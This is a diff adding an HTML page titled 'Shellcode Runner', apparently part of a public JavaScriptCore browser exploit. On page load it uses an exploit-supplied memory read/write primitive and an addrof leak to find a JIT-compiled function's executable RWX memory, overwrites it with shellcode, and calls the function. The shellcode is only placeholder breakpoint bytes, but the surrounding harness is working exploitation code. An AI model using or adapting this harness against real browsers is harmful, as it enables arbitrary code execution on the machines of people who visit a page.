@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      font-family: monospace;
+    }
+  </style>
+
+  <script src="utils.js"></script>
+  <script src="int64.js"></script>
+  <script src="pwn.js"></script>
+
+  <script>
+    function print(msg) {
+        document.body.innerText += msg + '\n';
+    }
+
+    // Replaces the JIT-compiled code for a function with the given shellcode and runs it.
+    //
+    // This code is pretty version dependent since it depends on fixed property offsets.
+    // Could be improved but this is good enough for now.
+    function runShellcode(shellcode) {
+        if (!isVulnerable()) {
+            print("[-] JSC version not vulnerable. Aborting");
+            return;
+        }
+
+        function makeJITCompiledFunction() {
+            function target(x) {
+                return x;
+            }
+
+            // Force JIT compilation.
+            for (var i = 0; i < 1000; i++) {
+                target(i);
+            }
+
+            return target;
+        }
+
+        // Setup the memory read/write primitive.
+        pwn();
+
+        // Now the easy part:
+        //   1. Leak a pointer to a JIT compiled function
+        //   2. Leak the pointer into executable memory
+        //   3. Write shellcode there
+        //   4. Call the function
+        var func = makeJITCompiledFunction();
+        var funcAddr = addrof(func);
+        print("[+] Shellcode function object @ " + funcAddr);
+
+        var executableAddr = memory.readInt64(Add(funcAddr, 24));
+        print("[+] Executable instance @ " + executableAddr);
+
+        var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
+        print("[+] JITCode instance @ " + jitCodeAddr);
+
+        var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
+        print("[+] RWX memory @ " + codeAddr.toString());
+
+        print("[+] Writing shellcode...");
+        memory.write(codeAddr, shellcode);
+
+        print("[!] Jumping into shellcode...");
+        func();
+    }
+
+    var SHELLCODE = [0xcc, 0xcc, 0xcc];
+
+    window.onload = function() { runShellcode(SHELLCODE); };
+  </script>
+
+  <title>Shellcode Runner</title>
+</head>
+<body>
+</body>
+</html>
